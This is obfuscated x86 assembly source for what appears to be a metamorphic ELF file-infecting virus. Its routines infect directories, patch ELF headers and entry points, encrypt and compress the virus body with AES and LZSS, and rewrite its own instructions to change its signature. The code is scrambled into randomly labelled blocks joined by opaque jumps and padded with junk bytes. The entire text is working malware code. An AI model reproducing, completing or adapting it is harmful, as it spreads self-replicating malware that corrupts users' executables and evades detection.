    jmp         $+4
db 0x40, 0x38
    je          ..@Da0RAFMi95Mc
    jne         ..@Da0RAFMi95Mc
..@QKbksaxfm0sz:
    xchg        rbx, rbx
    jb          ..@qzkMsRomW1Qh
    jae         ..@qzkMsRomW1Qh
..@PRiTBFZFekcM:
    ret
    js          LzssEncoder
    jns         LzssEncoder
..@iqizEqI8AFAh:
%ifdef X86_32
    and         edx, 0ffffc0ffh
    cmp         edx, 9090c031h
%endif
    jb          ..@5tFOTS1zWAq3
    jae         ..@5tFOTS1zWAq3
..@i7j4S70bN9g7:
    mov         rdx, rdx
    mov         r2, m6
    jmp         $+3
db 0x3c
    jmp         $+5
db 0x7a, 0x6c, 0x4f
    jb          ..@CYHL6bOBwQos
    jae         ..@CYHL6bOBwQos
..@8cLwJr8Q3Php:
    and         bl, 11000111b
    jmp         ..@Q8IZtkK1Mdvg
..@xffAMAhx40ez:
    pop         rsi
    mov         rax, (-1)
    ret
    js          ConvertMoveZeroToXor
    jns         ConvertMoveZeroToXor
..@XeAfyXcrj4C8:
    mov         r5, r3
    jmp         $+5
db 0x36, 0xbb, 0x0a
    jmp         $+4
db 0xa8, 0xad
    jmp         ..@7WziDKAWlhTF
..@Xti8gHOk0tZB:
    mov         cl, dl
    jl          ..@w5nHBODhFtnt
    jge         ..@w5nHBODhFtnt
..@h7EBn3ldMjs5:
    cmp         al, 0xa
    jl          ..@FpDZW3fh3DGs
    jmp         $+5
db 0x74, 0xa6, 0x6f
    jl          ..@A0abqxS1xIPK
    jge         ..@A0abqxS1xIPK
..@0Xqqp1KMJv1l:
    xor         rax, rax
    jmp         $+4
db 0x8e, 0x17
    jmp         ..@nreh9Ay9foxT
..@DAv8jFP4vqZ1:
%ifdef X86_32
    jnz         ..@FHu5TkFyCC6y
%endif
    js          ..@SLzDbYpGtJm7
    jns         ..@SLzDbYpGtJm7
..@w0GNJaEUgaXI:
    mov         rsi, r5
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xchg        rsi, rsi
    jmp         $+5
db 0xb6, 0x2d, 0xb4
    jmp         ..@AyfldDzxiL59
..@C1IPVEuZyXlT:
    pop         rsi
    jmp         ..@ahKlxwhiLqeL
..@frpP2AQU7tY2:
    xor         r4, r4
    VAR         packed, procs
    jmp         $+3
db 0xe6
    jl          ..@3LPX5WJ3Bn8h
    jge         ..@3LPX5WJ3Bn8h
..@r6g9AiHAca5e:
    sub         rsp, _DYNPIE_OFF_size
    jl          ..@pNy9Bq6a4gzd
    jge         ..@pNy9Bq6a4gzd
..@xMY4Q87eguJl:
    mov         rax, SYS_FORK
    jl          ..@i6Q7rfY5rNKQ
    jge         ..@i6Q7rfY5rNKQ
..@WbkAWMVsyCgj:
    push        rcx
    jmp         ..@wPXGuHug9CjI
..@gsNLeDGj2KXt:
    mov         rdi, rdi
    call        MemMove
    jmp         ..@smMPzgfPJiIo
..@rfTKiQCodtiq:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    and         edx, 00c0fffah
%endif
    jmp         $+4
db 0xd3, 0xad
    jmp         $+5
db 0x34, 0xfe, 0x31
    js          ..@83EuOCBXtNFk
    jns         ..@83EuOCBXtNFk
..@h3oSuE45nny1:
    xor         rcx, rcx
    mov         rdi, m6
    jl          ..@SaFUvXK02XDn
    jge         ..@SaFUvXK02XDn
..@BfVpZN5rst6N:
    mov         rdx, rdx
    jb          ..@tKf3LFFiVtbl
    jae         ..@tKf3LFFiVtbl
..@iRabguBenThU:
    xor         rax, rax
    jmp         $+4
db 0x20, 0x61
    js          ..@VlSo5p1B4mdx
    jns         ..@VlSo5p1B4mdx
..@bWIx8pi8FM5X:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
%endif
    je          ..@ZP5JiLNf3G82
    jne         ..@ZP5JiLNf3G82
..@Z7ntUuJ1JsBJ:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    push        rbx
    je          ..@fpNMOAkxFWpk
    jne         ..@fpNMOAkxFWpk
..@zUSU96Pfv1Xo:
    push        rax
    pop         rax
    jl          ..@Kff1FObCq4g0
    jge         ..@Kff1FObCq4g0
..@tM6ETJJAfemv:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jl          ..@ap1OFRjhzpq1
    jge         ..@ap1OFRjhzpq1
..@eutDmJXG0E2c:
%ifndef ENABLE_DEBUGGING
    push        rdx
    pop         rdx
    mov         rbp, rbp
%endif
    jl          ..@vBwJFEgFfYX0
    jge         ..@vBwJFEgFfYX0
..@fclhcmkp3evW:
    pop         rdx
    pop         rcx
    jmp         $+3
db 0xe9
    jmp         $+4
db 0x13, 0xbf
    jmp         $+3
db 0xc3
    js          ..@M8TWLZVLajVn
    jns         ..@M8TWLZVLajVn
..@3GmWyn4E4deB:
    push        rbx
    pop         rbx
    jmp         ..@ImoOSieRujWA
..@pTVJP3ywlcRb:
    rep         nop
    je          ..@iD9ofCuy6ncq
    jne         ..@iD9ofCuy6ncq
..@zOf2xKaFNAjc:
    or          cl, al
    mov         rbp, rbp
    shr         rax, 8
    jmp         $+4
db 0x68, 0x2f
    jmp         $+3
db 0x5c
    jmp         $+3
db 0x1c
    jmp         ..@9rIVe4PiRr1v
..@0tjfjn0cGnEi:
    mov         rcx, rcx
    mov         BYTE [r1], '/'
    jl          ..@aAWvIglwwDdm
    jge         ..@aAWvIglwwDdm
..@KVwNGJiQRqU7:
    mov         r3, _decrypt-_virus
    jl          ..@7bgtyRL83eWW
    jge         ..@7bgtyRL83eWW
..@QnAcoLRrgE9Z:
    push        rax
    jb          ..@lSrWTU0rFAU4
    jae         ..@lSrWTU0rFAU4
..@S0AyWdqutTJr:
    mov         DWORD [rdi+1], edx
    jmp         ..@7sPSfyQ35Oiw
..@T89sjM1aQhhb:
    mov         ax, WORD [r1]
    jb          ..@NyjxZpbMAaUL
    jae         ..@NyjxZpbMAaUL
..@3NzYAXYjms3Q:
    mov         r2, QWORD [r1+e_h.e_entry]
    test        r2, r2
    jz          ..@jAAW6sOMU7Ms
    jl          ..@s0uOMgNXVLnO
    jge         ..@s0uOMgNXVLnO
..@LJTG7SweJbk4:
    jmp         ..@oOAFpBBFbmEs
    jmp         $+4
db 0x71, 0x05
    jl          ..@TlOOr11ZBt9S
    jge         ..@TlOOr11ZBt9S
..@PNvA7DNCMUcm:
    mov         rax, 0x40
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         ..@5IaScHszcnAj
..@QKDUADrOjK9R:
    pop         rax
    pop         rdi
    jmp         $+5
db 0x96, 0x7f, 0xd3
    jmp         ..@RbzGLLGryda5
..@d2O33GeSKt6I:
%ifdef X86_64
    shl         rbx, 8
%endif
    jmp         ..@xbO8jaO25GTz
..@Y5hTkaxxJf2K:
    xor         rbx, rbx
    jmp         ..@BCXpeJBHiSBd
..@FFrouoDL6QnE:
%ifdef X86_64
    mov         rax, rsi
    and         rax, 1b
%endif
    jmp         $+3
db 0xeb
    jl          ..@bccJwjkLKhZf
    jge         ..@bccJwjkLKhZf
..@kt8ivBDxhclc:
    jmp         ..@4QdH7xjBsO4p
    jmp         $+4
db 0xa9, 0x5d
    jmp         $+3
db 0x90
    jmp         ..@zUSU96Pfv1Xo
..@fCj1D8YWltA8:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0xdc, 0xc4, 0x4f
    jmp         $+3
db 0x3e
    jmp         ..@VXFUrLEkftFr
..@DSsjZ3RFAgrT:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+4
db 0xb3, 0xad
    jl          ..@P3NCZ0WrmP1x
    jge         ..@P3NCZ0WrmP1x
..@sOei3ACqWSIx:
    sub         rcx, m6
    mov         eax, 0x00
    jmp         $+3
db 0xbc
    js          ..@9NXcGlv8hxX7
    jns         ..@9NXcGlv8hxX7
..@2ZsVGzlyFXu6:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
    mov         edx, 11b
    mov         r10, 0x22
%endif
    jmp         ..@sBZAR8ZRPCfJ
..@FpDZW3fh3DGs:
    add         eax, 0x30
    jmp         ..@Fo0VENIgLkDY
    jb          ..@tRQgcVEpIQNn
    jae         ..@tRQgcVEpIQNn
..@UwRkXAxXOXl8:
    mov         rbp, [rbp]
    call_vsp    Aes256KeyExpansion
    pop         rbp
    jb          ..@4lMbtFoP5m6u
    jae         ..@4lMbtFoP5m6u
..@0kckExLfYr2W:
%ifdef X86_64
    je          ..@60VAZNZZ7BIJ
%endif
    js          ..@YGJvlt6so6DZ
    jns         ..@YGJvlt6so6DZ
..@nVRJYLh6LAtE:
    ret
    jmp         $+4
db 0xb6, 0x42
    jmp         $+4
db 0x5b, 0xf2
    jmp         IsELFComplete
..@HzrwbcTo9vEe:
%ifdef X86_64
    xchg        rcx, rcx
%endif
    je          ..@VouQZ7yCPWe2
    jne         ..@VouQZ7yCPWe2
..@W1LuuxNnE1kc:
%ifdef X86_64
    mov         bx, 5841h
    or          bx, dx
    jmp         ..@NDWcW9tDbkDC
%endif
    js          ..@0HVr0wj7GkHQ
    jns         ..@0HVr0wj7GkHQ
..@Roi79lGWWlBM:
    jmp         ..@zRsTC2qr0xP2
    jmp         ..@g09Y2ImfeQvY
..@dQGwxJuilyOz:
    mov         edx, DWORD [rdi]
    jmp         $+4
db 0xbe, 0x11
    jl          ..@Y5hTkaxxJf2K
    jge         ..@Y5hTkaxxJf2K
..@6uirjlY8BdW4:
    cmp         rax, 0x01
    mov         rsp, rsp
    jmp         ..@qZea3QA1UtAP
..@ESQC3RhIMwKk:
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0xb9
    je          ..@SsRd9SeEWNUH
    jne         ..@SsRd9SeEWNUH
..@q0VQy8xGJise:
%ifdef X86_64
    shr         rax, 8
%endif
    jmp         $+5
db 0x31, 0xe6, 0x04
    jl          ..@D67Wc1UAM9AW
    jge         ..@D67Wc1UAM9AW
..@6me2Obr84jVd:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+5
db 0xc5, 0x8a, 0x21
    jb          ..@yvX1ALgr5DzH
    jae         ..@yvX1ALgr5DzH
..@GoLKN333aX1K:
%ifdef X86_32
    mov         rax, rax
%endif
    jmp         $+4
db 0x72, 0xa1
    jmp         $+5
db 0x62, 0xcf, 0x2f
    je          ..@PNDsfRdj7XUT
    jne         ..@PNDsfRdj7XUT
..@0QrhOytUNSsH:
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    jmp         $+4
db 0x00, 0x59
    jl          ..@MIqwcm3uIQ8J
    jge         ..@MIqwcm3uIQ8J
..@G95fqYnvF1AA:
    ret
    jl          ConvertMoveToPushPop
    jge         ConvertMoveToPushPop
..@kBgzb2EEIGiI:
    cmp         BYTE [rdi+rcx], 90h
    jmp         $+5
db 0x05, 0x6b, 0x09
    jl          ..@75iFbhqJqWGS
    jge         ..@75iFbhqJqWGS
..@xLZFf3HwpiKp:
    call        InfectDirectory
    jmp         $+3
db 0x90
    jmp         $+5
db 0xec, 0xd5, 0x23
    jb          ..@nmbeZQQuw2Lo
    jae         ..@nmbeZQQuw2Lo
..@WMamxcs9cFuu:
%ifdef X86_64
    xchg        rbx, rbx
%endif
    js          ..@OsSaY63hHUhE
    jns         ..@OsSaY63hHUhE
..@iaPPKiTMqQYj:
    ret
    jmp         ..@jAAW6sOMU7Ms
..@zcjuI0RlxM6o:
    sub         rsp, 0x20
    jmp         ..@WqnH6zy5bfzs
..@csWvJ3duLGi8:
    xchg        rdi, rdi
    jmp         $+4
db 0x38, 0x67
    jb          ..@gHIEYCmk273H
    jae         ..@gHIEYCmk273H
..@VlSo5p1B4mdx:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jb          ..@jBPVf0lNRLx6
    jae         ..@jBPVf0lNRLx6
..@saJH5OOifWgc:
    test        cl, cl
    jmp         $+3
db 0x91
    jmp         $+4
db 0xcf, 0x2c
    jmp         $+5
db 0xf2, 0x91, 0x18
    jmp         $+5
db 0x8f, 0xbf, 0xf8
    js          ..@KTLcHSCJ831I
    jns         ..@KTLcHSCJ831I
..@NLGIwbJ4YuqL:
    push        rcx
    jmp         $+4
db 0x88, 0x93
    jmp         $+5
db 0xd3, 0x61, 0xf7
    js          ..@0n4iIKtBjQtI
    jns         ..@0n4iIKtBjQtI
..@79gxHaKYWUup:
    mov         BYTE [rsp+_MUTA_OFF.random_BYTE], dl
    jmp         $+4
db 0x95, 0x18
    jmp         $+4
db 0x00, 0xfd
    jmp         ..@zxX0SsVbvDhz
..@3lXGz0mOJNRM:
%ifdef X86_32
    cmp         dx, 5850h
    je          ..@22mKOCewfWK9
%endif
    jmp         $+4
db 0xa1, 0x2b
    jb          ..@aTsOUHHFAfRF
    jae         ..@aTsOUHHFAfRF
..@cle90Kde6jzn:
    xor         rdx, rdx
    mov         eax, DWORD [rdi+1]
    mov         dx, WORD [rdi+5]
    jmp         $+4
db 0xec, 0x53
    jl          ..@6N9hEE3pzfwx
    jge         ..@6N9hEE3pzfwx
..@U6lMVIe3RT2f:
    mov         DWORD [rsp+_MUTA_OFF.size], r2d
    mov         QWORD [rsp+_MUTA_OFF.key], r3
    mov         DWORD [rsp+_MUTA_OFF.index], 0x00
    jmp         ..@UmkWJKXCY9no
..@4M2dw4BR8LL5:
    mov         r3, r4
    jmp         ..@i7j4S70bN9g7
..@IjVleKN9pNVo:
    ret
    jmp         $+5
db 0xc0, 0xb6, 0x81
    jmp         $+5
db 0xc1, 0xa1, 0x5d
..@ira5zAwBpEzJ:
    cmp         rax, 0x00
    jmp         $+3
db 0x82
    jmp         $+5
db 0xb4, 0xdc, 0x39
    jmp         $+4
db 0x39, 0xaa
    je          ..@8xI6m8fWwWl8
    jne         ..@8xI6m8fWwWl8
ConvertXorToMoveZero:
    jmp         ..@6RZOuwSaZMw9
..@SiDTMIx9T49H:
    xor         rax, rax
    push        rdx
    xchg        rax, rax
    jmp         $+4
db 0x78, 0x6a
    js          ..@YCCaz6vDYcQ2
    jns         ..@YCCaz6vDYcQ2
..@AlqeDeU8ylOV:
    mov         ax, WORD [r5+e_h.e_shentsize]
    mul         r2
    add         rax, r1
    jmp         $+3
db 0x94
    jb          ..@uSkRakML4wyN
    jae         ..@uSkRakML4wyN
..@Eanh4onfRkFS:
    pop         r1
    cmp         r1, 0x00
    je          ..@InqweSwsTToA
    jmp         ..@xMY4Q87eguJl
..@ky1a77jSuhe6:
    xor         r1, r1
    jb          ..@KiO856RHtM0Q
    jae         ..@KiO856RHtM0Q
..@WxUbvXTOspK9:
    pop         rbx
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jmp         $+5
db 0x57, 0x97, 0x9f
    js          ..@vPEIj78DGbk6
    jns         ..@vPEIj78DGbk6
..@Grx3d6opKINO:
%ifdef X86_32
    pop         rcx
%endif
    js          ..@6e0MHlVBhdYv
    jns         ..@6e0MHlVBhdYv
..@wBYnpaMFjl36:
    xor         r3, r3
    xor         r4, r4
    jl          ..@zNN43TdSOtOa
    jge         ..@zNN43TdSOtOa
ConvertMoveZeroToXor:
    jmp         ..@BpgWv3brgE11
..@yvVheYobv9fz:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    call        UpdateSignature
    jmp         $+5
db 0x26, 0x43, 0xc4
    jb          ..@cGP09nYXMB8D
    jae         ..@cGP09nYXMB8D
..@ZgOevwOi66bb:
    xor         rax, rax
    jmp         $+3
db 0x4b
    je          ..@xFlsiW36zZur
    jne         ..@xFlsiW36zZur
..@C9oZdQcyRsDC:
    pop         rax
    jne         ..@XXbV8CVn9b1K
    xor         rsi, rsi
    jmp         $+5
db 0xc4, 0x21, 0xc5
    jmp         $+5
db 0x35, 0x3d, 0xe5
    jmp         ..@VAB8z7MQTOwl
..@Mn0EEe3KoPhJ:
    mov         r4, r5
    mov         r5, [rsp]
    jmp         $+5
db 0x6a, 0xce, 0x08
    jmp         $+4
db 0x39, 0x1c
    jb          ..@CpwjX2q4tcA0
    jae         ..@CpwjX2q4tcA0
..@4jdKikcJCal9:
    mov         rdi, rbx
    jmp         $+5
db 0xff, 0x53, 0xf8
    jl          ..@7JDPnzG199QM
    jge         ..@7JDPnzG199QM
..@fOdaljOO5u9M:
    rep         stosb
    mov         r2, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    jmp         $+4
db 0xb2, 0x01
    jmp         $+4
db 0xe7, 0x77
    jl          ..@EzGzqsuNjfcp
    jge         ..@EzGzqsuNjfcp
..@CAOXtb4J9z8x:
    push        rcx
    jmp         $+4
db 0x74, 0x80
    jmp         $+3
db 0x88
    jl          ..@KEFW8LkDlusu
    jge         ..@KEFW8LkDlusu
..@cnif1qfbEMzD:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    jmp         $+5
db 0x8e, 0x6b, 0x38
    jmp         $+3
db 0x36
    jmp         $+4
db 0xa1, 0xf2
    jb          ..@WOmA4HzYWrG5
    jae         ..@WOmA4HzYWrG5
..@egOpJVzoGa48:
%ifdef X86_64
    jz          ..@ePbEeT83Mabu
%endif
    jmp         $+5
db 0x1e, 0x3f, 0x4e
    jmp         $+5
db 0x82, 0x1a, 0xe1
    je          ..@CzPnK90aBfeT
    jne         ..@CzPnK90aBfeT
..@zcXGIL1IoMft:
    mov         rdi, rsi
    jb          ..@oJgCuyGtwPFr
    jae         ..@oJgCuyGtwPFr
..@gdvLcxcDzWBy:
    ret
    jmp         $+3
db 0xdd
    js          ConvertXorToMoveZero
    jns         ConvertXorToMoveZero
..@M5BzQE6qGmdQ:
    inc         WORD m5
    jl          ..@9Vm1fR0OU85v
    jge         ..@9Vm1fR0OU85v
..@VtAa4Ss83pkU:
    pop         rax
    xor         rdx, rdx
    mov         dx, WORD [rdi]
    js          ..@oqU2FP1WOteU
    jns         ..@oqU2FP1WOteU
..@PJuRPZKoDMt1:
%ifdef X86_64
    shl         rbx, 8
    mov         bl, 41h
%endif
    jmp         $+5
db 0x76, 0x02, 0x70
    jmp         ..@Z9ElKfnhyf6L
..@Y6XplWauVBJc:
    test        al, al
    jmp         $+3
db 0x7b
    je          ..@DkH944DOdydq
    jne         ..@DkH944DOdydq
..@q7Lq46LLN3PZ:
    lea         r1, [rsp+_NBF_OFF.key]
    jb          ..@LdNdNcP81K6k
    jae         ..@LdNdNcP81K6k
..@I5Yj1s61ITEf:
    jnz         ..@bNrX2sLSsm2Z
    jl          ..@xJdXYfYj1DWz
    jge         ..@xJdXYfYj1DWz
..@WOmA4HzYWrG5:
%ifndef ENABLE_DEBUGGING
    pop         rdi
%endif
    jmp         ..@pUBBlbENMw2N
..@P7kDwU2zbZ1Y:
    pop         rax
    jl          ..@V69wwNogNNQw
    jge         ..@V69wwNogNNQw
..@5vvu2keQw37y:
%ifdef X86_32
    mov         bx, 0089h
%endif
    jmp         $+4
db 0x74, 0x84
    jl          ..@8ryqB5a1QuFK
    jge         ..@8ryqB5a1QuFK
..@UGto9x64YTCI:
%ifdef X86_64
    jne         ..@7xzVDcxhsoTz
%endif
    jmp         ..@3bK9pl6xTi6Q
..@s5v51612WUmr:
    xchg        rdi, rdi
    jmp         $+4
db 0x8d, 0xe9
    jl          ..@tHW9iU2ffxyY
    jge         ..@tHW9iU2ffxyY
DYNPIEValidation:
    jmp         ..@0wLx4FHKMqrz
..@i1jW1qunKpnX:
    mov         rax, rax
    jmp         $+4
db 0x23, 0xdf
    je          ..@MUu3loMdUyaf
    jne         ..@MUu3loMdUyaf
..@WWrXJUIHp0sA:
    push        rsi
    pop         rsi
    js          ..@e4GjuuwU50Xn
    jns         ..@e4GjuuwU50Xn
..@B6O5ebRPbhaE:
    mov         QWORD [rsp+_UPDATASIG_OFF.meta_ptr], r4
    jmp         ..@JVO8S3iPJ9P9
..@0xZvFLgoaoXL:
    mov         r1, rsp
    add         r1, bytes
    mov         r2, 0x100
    jmp         $+4
db 0x99, 0xcf
    jmp         ..@KcQMrchrXElm
..@HWMG2WDg9Evh:
    push        rcx
    mov         rdi, rsi
    jmp         ..@0QrhOytUNSsH
..@NOQdt8IlsrEZ:
    push        r1
    jb          ..@0OIZtxORQWHL
    jae         ..@0OIZtxORQWHL
..@Szd9WNMJ7OtY:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         ..@s1SiTv7hwNmI
..@SEqdnHLyL8q0:
    pop         rax
    jmp         ..@4vZTWU24fFP3
..@PXehnS2x4PKS:
    mov         QWORD [r2+p_h.p_paddr], r3
    jmp         $+4
db 0x13, 0x09
    je          ..@cDsS7GynK2BI
    jne         ..@cDsS7GynK2BI
..@1TDjoA5z7Tte:
    push        rsi
    pop         rsi
    cmp         dl, 05h
    jmp         $+4
db 0x13, 0x3d
    jmp         $+5
db 0xb4, 0x0b, 0xcc
    jmp         $+3
db 0xb6
    js          ..@g65QWTvWiKQI
    jns         ..@g65QWTvWiKQI
..@Zz396jjHEe4l:
%ifdef X86_32
    int         0x80
    xchg        rsi, rsi
    pop         ebp
%endif
    jmp         $+5
db 0xf2, 0x8f, 0x0d
    jb          ..@v7fPcROVTh7G
    jae         ..@v7fPcROVTh7G
..@almBdB1MqCbm:
    mov         rbp, rbp
    xor         rcx, rcx
    jmp         $+5
db 0x4d, 0x69, 0xd2
    jmp         ..@fpHGHU8OViRA
..@oSYzTnjLffp3:
    and         edx, 0ffffh
    jmp         ..@PPVw3N0i35rn
..@y56kgkCI9WcJ:
    xor         rdx, rdx
    jmp         $+3
db 0xa3
    jmp         $+4
db 0x44, 0x82
    jl          ..@xYxGmJi6dLbM
    jge         ..@xYxGmJi6dLbM
..@iD9ofCuy6ncq:
    je          ..@Xnru4hfscH9K
    cmp         dl, 0e9h
    jmp         $+5
db 0xab, 0xef, 0xb0
    jl          ..@RmtXpyRcQuvp
    jge         ..@RmtXpyRcQuvp
..@Sa7B2Ycw9Nf3:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
    push        rdi
    pop         rdi
%endif
    jl          ..@tM6ETJJAfemv
    jge         ..@tM6ETJJAfemv
Aes256Encryption:
    jmp         ..@3qAIVa1Mip81
..@dzxwQAZNTAv2:
    jmp         ..@HhOszDPCRbSi
    jl          ..@qRjpeFo45cd1
    jge         ..@qRjpeFo45cd1
..@fpHGHU8OViRA:
    mov         rsi, QWORD [rsp+bytes]
    jmp         $+5
db 0x70, 0xb9, 0x67
    js          ..@Pp2UNMLw585i
    jns         ..@Pp2UNMLw585i
..@lOQEU3M5o9WQ:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+5
db 0xa9, 0x0e, 0xc7
    jmp         ..@8adsddSP1sdT
..@NhXyy236k85k:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         ..@KneM0DHtjjL7
..@4XOHduOhHMDP:
    test        r2, r2
    jmp         ..@tl8db93T9wpV
..@IuLUg0EjKzE5:
    xor         rax, rax
    xor         rbx, rbx
    jb          ..@nLIKB09KFAye
    jae         ..@nLIKB09KFAye
..@5WcZY91DYcRB:
    pop         rsi
    jmp         ..@5YEP8pJlRtgW
..@BNkq8djVPgWH:
%ifdef X86_64
    pop         rcx
    mov         bx, dx
%endif
    js          ..@UtTZ0Myf2iar
    jns         ..@UtTZ0Myf2iar
..@rl5d2gXKtd2Z:
    call        MemMove
    mov         rcx, signature_len
    mov         rdi, QWORD [r5+file.fileptr]
    jl          ..@SBOoNEKI7i8Z
    jge         ..@SBOoNEKI7i8Z
..@YvOeIfaLRIRL:
    xchg        rcx, rcx
    mov         eax, SYS_MREMAP
    jmp         $+3
db 0x9c
    jmp         ..@HWkqb8yVyYo0
..@k79i1LYY7b21:
    mov         rsi, rsi
    mov         r2, QWORD [r1+e_h.e_phoff]
    jmp         ..@KxJtgK4zqY6E
..@koSxIbzlLK85:
    movdqu      xmm1, oWORD [rsp+0x20]
    js          ..@fw2yjVkAc55i
    jns         ..@fw2yjVkAc55i
..@OrUFRcF9bGkg:
    xor         r3, r3
    mov         r1d, eax
    mov         rax, rax
    jl          ..@NR6F8jJSRiZW
    jge         ..@NR6F8jJSRiZW
..@3XRuMvt8VxQW:
    mov         DWORD [rsi+rcx], ebx
    js          ..@Bza0smcU3CY3
    jns         ..@Bza0smcU3CY3
..@0GEkYsOWitg4:
    pop         rsi
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jb          ..@3FFJargPpwMz
    jae         ..@3FFJargPpwMz
ConvertMoveValueToPushPopValue:
    jmp         ..@L2IKjf9eE98W
..@LvEJgcnZ2V0d:
    jne         ..@JPH4E5RFkeA8
    jmp         ..@FKwHFue2lroP
..@VlV1bMCtPtvT:
    mov         rdx, rdx
    js          ..@AZjoR2Koq0cR
    jns         ..@AZjoR2Koq0cR
..@n4K2yyQUjZpO:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+5
db 0x39, 0xb9, 0x93
    jmp         ..@Z7ntUuJ1JsBJ
..@0a7eG6ITklLN:
    cmp         r4, 0x00
    jmp         $+5
db 0x99, 0x54, 0x6c
    jmp         $+4
db 0x23, 0x5e
    je          ..@RN8cLbxeCoeS
    jne         ..@RN8cLbxeCoeS
..@VqQnD3rV5qqG:
    pop         rdi
    jmp         $+5
db 0xab, 0xfa, 0x87
    jmp         $+3
db 0x93
    jl          ..@QizyuPKJqx4r
    jge         ..@QizyuPKJqx4r
FileValidation:
    jmp         ..@WWrXJUIHp0sA
..@bwdRKhG1d853:
    push        r4
    jmp         $+3
db 0x82
    js          ..@8f95lBbHZ92R
    jns         ..@8f95lBbHZ92R
..@RCHOmzii8fqW:
    pop         rdi
    js          ..@RZxOUEC6HSLH
    jns         ..@RZxOUEC6HSLH
..@buWmpYFpOQsU:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    mov         r3, rax
    jb          ..@0Bj2QkI1eomT
    jae         ..@0Bj2QkI1eomT
InfectDirectory:
    jmp         ..@6me2Obr84jVd
..@tU1JfeaZFjGQ:
    cmp         rax, (-1)
    jmp         $+5
db 0x4c, 0x9a, 0x21
    jl          ..@4KbzGHAAiHIc
    jge         ..@4KbzGHAAiHIc
..@1MDKn4vZBnUk:
    jmp         ..@oCGmYSVwYlWR
    jmp         $+3
db 0xdb
    jl          ..@8cLwJr8Q3Php
    jge         ..@8cLwJr8Q3Php
..@9WMYvxrqUnZ0:
    jnz         ..@jAAW6sOMU7Ms
    jmp         $+4
db 0xe1, 0x44
    jmp         $+5
db 0x78, 0xe4, 0x1a
    jl          ..@bFMMf2zUWMo1
    jge         ..@bFMMf2zUWMo1
..@7kWhAgQd9Zsf:
    xchg        rdi, rdi
    jmp         $+5
db 0xee, 0xfa, 0xb1
    jmp         ..@ZglqzhYUIKUk
..@Al8jT2b21npX:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    jl          ..@hXgjlBOCgSoJ
    jge         ..@hXgjlBOCgSoJ
..@86d358r5NbsN:
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@Ys8L1a2MFhLU
..@ckFKMBR1KXRD:
    pop         rcx
    pop         rsi
    jb          ..@Sd65Es3DJcFZ
    jae         ..@Sd65Es3DJcFZ
..@r8noLx1NSp4M:
    ret
    jb          Aes256Encryption
    jae         Aes256Encryption
..@iqsqiZ7wajYq:
%ifndef ENABLE_DEBUGGING
    jl          ..@eLAQFp4O4zCz
%endif
    jmp         $+3
db 0xd7
    jmp         ..@w1Re8m6sZjzA
..@CvsCR6xL0F5j:
    xor         rax, rax
    jmp         $+5
db 0xb6, 0xe1, 0x71
    jmp         $+5
db 0x81, 0xb0, 0xb3
    jb          ..@jdAF23efy53g
    jae         ..@jdAF23efy53g
..@6aIHVPro1H8t:
    cmp         rax, 0x0
    jle         ..@CVjVoYHWEsDA
    jmp         $+3
db 0x60
    jmp         ..@tqiR2TBYqkd1
..@u1Aq4nMY4TnA:
    mov         rdx, rdx
    je          ..@wjnxZPSRQcFT
    jne         ..@wjnxZPSRQcFT
..@X93v2wMBT5xu:
    mov         rbx, rbx
    push        rcx
    mov         rdx, rdx
    js          ..@5FgwDHLOmMzG
    jns         ..@5FgwDHLOmMzG
..@w5NpUI0VlVwW:
    mov         rax, (-1)
    push        rbx
    jmp         $+4
db 0x8a, 0xdc
    jmp         $+5
db 0x8d, 0xf1, 0xad
    jmp         ..@YzsqwtvqzHfR
..@5tFOTS1zWAq3:
    jne         ..@dvLhxmtLjpWS
    jmp         $+5
db 0xdb, 0x00, 0x34
    jl          ..@7wuNvhBbXtak
    jge         ..@7wuNvhBbXtak
WORDToDWORDASCII:
    jmp         ..@Dq2ue5AwuM2T
..@2SdzIFKamJF3:
%ifndef ENABLE_DEBUGGING
    jnz         ..@9oPClc9GvwdT
    xor         rax, rax
%endif
    jl          ..@ykvTzKIfqbV2
    jge         ..@ykvTzKIfqbV2
..@YFSwuBtTfvsG:
    mov         r1, m6
    jmp         ..@KXqFW1FIA1ZD
..@vB5r8ovFW3U9:
    push        r5
    jmp         $+3
db 0x37
    jmp         ..@mQwxqD5Fmg3s
..@m1LKjwfn8ZBL:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@DJeYEfUiyl5z
..@RshzZFqVEHAM:
%ifndef ENABLE_DEBUGGING
    push        QWORD 0x0
%endif
    js          ..@2GFbxCkktPQ7
    jns         ..@2GFbxCkktPQ7
..@oPGyRtXYW7Bi:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jmp         ..@i8HcJiDvnYdM
